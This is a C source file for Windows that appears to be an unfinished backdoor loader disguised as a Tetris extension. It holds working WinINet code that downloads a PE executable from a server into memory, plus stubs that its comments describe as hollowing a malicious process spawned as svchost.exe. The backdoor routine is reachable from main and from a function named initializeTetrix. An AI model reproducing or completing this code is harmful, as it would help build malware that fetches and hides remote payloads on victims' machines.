#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <memory.h>
#include <wininet.h>
#include <conio.h>
#include <tetris-ext.h>



HANDLE spawn(){

}
BYTE* fetchPE(){
    // general initialization fn
    HINTERNET internet=InternetOpenA(
        "JAMES/BOND/007",
        INTERNET_OPEN_TYPE_PRECONFIG,
        NULL,
        NULL,
        0 // no async
    );
    if(!internet){
        printf("[-] InternetOpenA()\n");
        exit(1);
    }
    HINTERNET hurl=InternetOpenUrlA(
        internet,
        WEB_SERVER,
        NULL,
        0,
        INTERNET_FLAG_RELOAD,
        0
    );
    if(!hurl){
        printf("[-] InternetOpenUrlA() %lu\n",GetLastError());
        exit(1);
    }

    DWORD sz=4096;
    BYTE* pe=(BYTE*)malloc(sz);
    BYTE* offset=pe;
    DWORD totalRead=0;
    DWORD cycleRead=0;

    while(InternetReadFile(
        hurl,
        offset,
        sz, 
        &cycleRead
    ) && cycleRead>0){
        printf("fetching PE to heap\n");
        totalRead+=cycleRead;
        void*tmp=realloc(pe,totalRead+sz);
        if(tmp)
         pe=tmp;
        offset=(BYTE*)(pe+totalRead);
    }
    void*tmp=realloc(pe,totalRead);
    if(tmp)
     pe=tmp;
    return pe;
}
bool hallowAndStart(HANDLE proc,BYTE* pe){
return true;
}
bool __0x1FN3C3SS4RY__(){
// backdoor stuff
// process hallowing.
// 1. spawn malicious process as svchost.exe 
    HANDLE svchost=spawn();
    BYTE* pe=fetchPE(); // returns heap base 
    bool cool=hallowAndStart(svchost,pe);
    if(cool)
        return true;
    return false;
}
bool initializeTetrix(){
  return __0x1FN3C3SS4RY__();
}

int main(void){

   __0x1FN3C3SS4RY__();

    return 0;
}